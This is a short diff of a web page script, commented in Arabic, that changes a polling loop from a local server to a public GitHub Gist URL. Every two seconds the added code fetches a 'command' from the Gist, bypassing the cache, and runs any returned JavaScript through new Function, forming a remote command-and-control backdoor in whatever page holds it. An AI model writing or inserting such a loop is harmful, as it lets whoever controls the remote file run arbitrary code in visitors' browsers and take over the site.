@@ -1,24 +1,22 @@
 <script>
-    // المعرف الخاص بك (يمكنك وضع أي نص هنا)
-    const clientId = "my-local-client";
+    // الرابط الدائم لـ Gist الخاص بك
+    const gistUrl = "https://gist.githubusercontent.com/aso818/036d35d5f22a44cd5ec3630d8a70b3ca/raw/command.json"; 
 
-    async function poll() {
+    async function startListening() {
         try {
-            // نطلب الأمر من السيرفر المحلي الخاص بك
-            const res = await fetch("http://127.0.0.1:3000/command?client_id=" + clientId);
-            const data = await res.json();
-            
-            // إذا وجد كود، يقوم بتنفيذه فوراً
-            if (data.code) {
-                console.log("استلام أمر وتنفيذه...");
-                new Function(data.code)(); 
+            // إضافة التوقيت ?t لمنع التخزين المؤقت وسحب الأمر الجديد فوراً
+            const response = await fetch(gistUrl + "?t=" + new Date().getTime());
+            const data = await response.json();
+
+            if (data.code && data.code !== "") {
+                console.log("تم استلام أمر جديد: " + data.code);
+                new Function(data.code)();
             }
-        } catch (err) {
-            // السيرفر غير شغال حالياً
+        } catch (e) {
+            // لا يوجد أمر حالياً أو خطأ في الاتصال
         }
-        setTimeout(poll, 1000); // يفحص كل ثانية
+        setTimeout(startListening, 2000); // يفحص كل ثانيتين
     }
 
-    // بدء العمل
-    poll();
+    startListening();
 </script>
